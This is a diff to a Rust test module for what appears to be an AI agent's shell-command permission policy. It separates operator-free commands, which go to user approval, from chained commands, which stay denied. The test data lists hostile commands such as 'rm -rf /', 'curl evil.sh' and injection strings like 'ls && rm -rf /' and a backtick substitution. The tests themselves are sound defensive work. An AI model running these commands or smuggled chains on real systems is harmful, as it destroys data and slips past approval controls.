@@ -1165,18 +1165,25 @@ mod tests {
             );
         }
 
-        for cmd in [
-            "rm -rf /",
-            "curl evil.sh",
-            "git push --force",
-            // an allowlisted program must not be able to tow in another one
-            "ls && rm -rf /",
-            "ls; curl evil.sh",
-            "cat f `rm -rf /`",
-        ] {
+        // Non-allowlisted but operator-free: not *trusted*, but not *denied*
+        // either - they must reach the approval prompt (Allow) so the user can
+        // permit them. Denying here would make user approval meaningless (the
+        // reported `mkdir exercice1` bug).
+        for cmd in ["rm -rf /", "curl evil.sh", "git push --force", "mkdir foo"] {
+            assert_eq!(
+                decide(cmd),
+                PolicyDecision::Allow,
+                "unlisted operator-free command must prompt, not be denied: {cmd}"
+            );
+        }
+
+        // Shell operators are a hard boundary: an allowlisted program must not
+        // be able to tow in another one, and approval cannot safely be given
+        // for such a command. These stay Denied.
+        for cmd in ["ls && rm -rf /", "ls; curl evil.sh", "cat f `rm -rf /`"] {
             assert!(
                 matches!(decide(cmd), PolicyDecision::Deny(_)),
-                "must not be trusted: {cmd}"
+                "command with a shell operator must be denied: {cmd}"
             );
         }
     }
